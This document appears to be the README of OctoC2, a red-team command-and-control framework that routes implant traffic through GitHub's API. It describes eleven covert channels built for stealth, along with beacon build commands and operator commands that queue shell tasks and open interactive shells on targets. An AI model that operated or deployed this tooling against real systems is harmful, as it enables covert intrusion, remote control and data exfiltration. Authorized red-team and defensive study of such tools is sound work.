<!--
  ╔═══════════════════════════════════════╗
  ║  OctoC2 — GitHub-Native C2 Framework  ║
  ╚═══════════════════════════════════════╝
-->

<p align="center">
  <img src="assets/OctoC2_transparent-Photoroom.png" alt="OctoC2 logo" width="260" />
</p>

<p align="center">
  GitHub-native C2. All traffic is HTTPS to <code>api.github.com</code>.<br>
  No VPS. No custom domains. No listening ports.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/version-v1.0.0-cyan" alt="v1.0.0"/>
  <img src="https://img.shields.io/badge/tentacles-11%20live-blue" alt="11 tentacles"/>
  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License"/>
</p>

> [!WARNING]
> **AUTHORIZED USE ONLY**
>
> For authorized red-team engagements and security research only. Use on systems you own or have explicit written authorization to test.
>
> Unauthorized use violates the CFAA, the UK Computer Misuse Act, and equivalent laws worldwide. The authors accept zero liability for misuse.

---

## About OctoC2

**OctoC2** is a fully GitHub-native command-and-control framework that turns GitHub itself into your C2 server and exfiltration channel. Every operator command and beacon response travels exclusively through GitHub's public API using legitimate features.

### Why OctoC2?

- **Zero infrastructure** — No servers, no domains, no open ports
- **Excellent OPSEC** — Traffic looks like normal developer or CI/CD activity on GitHub
- **Highly resilient** — 11 covert channels with configurable priority and automatic fallback
- **Strong encryption** — End-to-end with libsodium `crypto_box` (X25519 + XSalsa20-Poly1305)
- **Production-ready** — GitHub App auth with rotating 1-hour tokens, encrypted runtime key delivery
- **One-command setup** — Interactive wizard handles keygen, repo validation, config, and beacon build

---

## How it works

Every operator command and beacon response travels through GitHub's own API surface. From a network perspective, the beacon is a Bun process making authenticated HTTPS requests to `api.github.com`. No anomalous outbound connections, no self-signed certs, no beaconing to an IP you own.

The beacon picks a channel from a configurable priority list and falls back automatically if a channel goes dark. All payloads are encrypted with libsodium `crypto_box` / `crypto_box_seal`. The operator private key never touches the server or the beacon binary.

For production engagements, swap PATs for GitHub App auth: installation tokens expire hourly and are scoped to a single repository. The App private key is delivered to running beacons at runtime via an encrypted dead-drop — nothing sensitive is baked into the binary.

### Components

| Component   | Path                | Role |
|-------------|---------------------|------|
| Implant     | `implant/`          | Bun/TS beacon — 11 channels, automatic fallback, `--smol` memory mode |
| Server      | `server/`           | Task queue, beacon registry, SSE stream, gRPC endpoint |
| Dashboard   | `dashboard/`        | Operator UI — real-time beacon feed, task queue, result decryption |
| CLI         | `octoctl/`          | Setup wizard, service manager, beacon compiler, task queue, shell, results |
| OctoProxy   | `templates/proxy/`  | Relay through decoy repos via GitHub Actions |
| Modules     | `modules/`          | Loadable post-ex scripts: recon, screenshot, persist |

---

## Covert channels

| #  | Channel                  | Transport              | OPSEC notes |
|----|--------------------------|------------------------|-------------|
| T1 | Issues + Comments        | Issues API             | Payload in HTML comment; issue title contains no C2 identifiers |
| T2 | Branch + Files           | Git refs               | Branch named `infra-sync-{id8}`; task in `task.json`, ACK in `ack.json` |
| T3 | Actions Variables        | Variables API          | `INFRA_*` prefix; works from any environment with a PAT |
| T4 | Codespaces gRPC          | gRPC over SSH          | Tunnel through Codespace SSH; no external infrastructure |
| T5 | Pages + Webhooks         | Deployments API        | Deploy environment named `ci-{id8}` |
| T6 | Gists                    | Gists API              | Secret gist; filenames `svc-*.json` |
| T7 | Secrets / Variables      | Variables API          | `INFRA_CFG_{id8}` covert ACK; no repo secret touched at runtime |
| T8 | git notes                | Git refs API           | `refs/notes/svc-*`; invisible in GitHub web UI, no commit history |
| T9 | Steganography            | Git branches           | LSB alpha-channel PNG; payload in `infra-cache-{id8}` branch |
| T10| OctoProxy                | Decoy repos            | All traffic relayed through a separate repo you control |
| T11| HTTP / WebSocket         | WebSocket + REST       | HTTPS to Codespace Dev Tunnel port; falls back to REST polling |

Channel selection is configurable at build time via `--tentacle-priority`. The beacon automatically falls back through the priority list if a channel becomes unavailable.

---

## Quick start

**Requirements:** [Bun](https://bun.sh) >= 1.3, a private GitHub repo, a PAT with `repo` scope

```bash
# Install Bun (if needed)
curl -fsSL https://bun.sh/install | bash

# Clone and install
git clone https://github.com/dstours/OctoC2.git
cd OctoC2 && bun install

# Run the setup wizard
cd octoctl && bun run src/index.ts setup
```

The wizard walks you through:
1. GitHub credentials + repo validation
2. Operator keypair generation
3. Authentication mode (PAT or GitHub App)
4. Covert channel selection
5. Advanced config (proxy repos, Codespace gRPC, sleep tuning)
6. `.env` file generation
7. Beacon compilation
8. Dead-drop creation (App auth)
9. CLI installation to PATH

After setup:

```bash
# Start the C2 server + dashboard
octoctl start

# Check status
octoctl status

# List beacons (after deploying the beacon to a target)
octoctl beacons

# Queue a task
octoctl task <beaconId> --kind shell --cmd "whoami && id"

# View results
octoctl results <beaconId> --last 5

# Interactive shell
octoctl beacon shell --beacon <beaconId>

# Open the dashboard
# http://localhost:3000

# Stop everything
octoctl stop

# Pull updates
octoctl update
```

### Manual setup (alternative)

If you prefer to configure manually instead of using the wizard:

1. Generate an operator keypair
```bash
bun run octoctl/src/index.ts keygen --set-variable
```

2. Create a `.env` file at the project root
```bash
OCTOC2_GITHUB_TOKEN=<PAT>
OCTOC2_REPO_OWNER=<owner>
OCTOC2_REPO_NAME=<repo>
OCTOC2_OPERATOR_SECRET=<base64url-secret-from-keygen>
```

3. Start and build
```bash
octoctl start
bun run octoctl/src/index.ts build-beacon --outfile ./beacon --target bun-linux-x64
```

### Build examples

```bash
# Actions channel primary, Issues fallback
octoctl build-beacon --outfile ./beacon --tentacle-priority actions,issues

# Notes channel (max stealth), Issues fallback
octoctl build-beacon --outfile ./beacon --tentacle-priority notes,issues

# With GitHub App auth (recommended for production)
octoctl build-beacon --outfile ./beacon \
  --app-id <id> --installation-id <id>
# Then deliver the private key via dead-drop:
octoctl drop create --beacon <id> --app-key-file <pem>

# Codespaces gRPC with HTTP fallback
octoctl build-beacon --outfile ./beacon \
  --codespace-name <name> --github-user <user> \
  --tentacle-priority codespaces,http,issues
```

---

## CLI reference

```
octoctl setup                          Interactive setup wizard
octoctl start [server|dashboard]       Start C2 server and/or dashboard
octoctl stop  [server|dashboard]       Stop running components
octoctl status                         Show running components + health
octoctl update                         Pull latest code + reinstall deps

octoctl build-beacon --outfile <path>  Compile beacon with baked credentials
octoctl beacons                        List registered beacons
octoctl task <id> --kind <kind>        Queue a task for a beacon
octoctl results <id>                   View decrypted task results
octoctl beacon shell --beacon <id>     Interactive shell session

octoctl keygen [--set-variable]        Generate operator X25519 keypair
octoctl drop create --beacon <id>      Create encrypted dead-drop gist
octoctl drop list --beacon <id>        Search for existing dead-drops
octoctl proxy create                   Set up OctoProxy relay repo
octoctl tentacles list --beacon <id>   Show tentacle channel status
```

---

## Testing

```bash
make test   # implant + server + octoctl + dashboard

# E2E (requires env vars from .env)
bun scripts/test-end-to-end.ts --cleanup
bun scripts/test-end-to-end.ts --notes --gist --branch --secrets --actions --maintenance --cleanup
```

## Documentation

Full documentation at https://dstours.github.io/OctoC2/

---

## License

OctoC2 is released under the **MIT License** exclusively for **authorized red teaming, penetration testing, and security research**.

See the full license: [LICENSE](LICENSE)

> **Important**: Unauthorized use on systems you do not own or do not have explicit written permission to test is strictly prohibited and may violate applicable laws (CFAA, Computer Misuse Act, etc.).
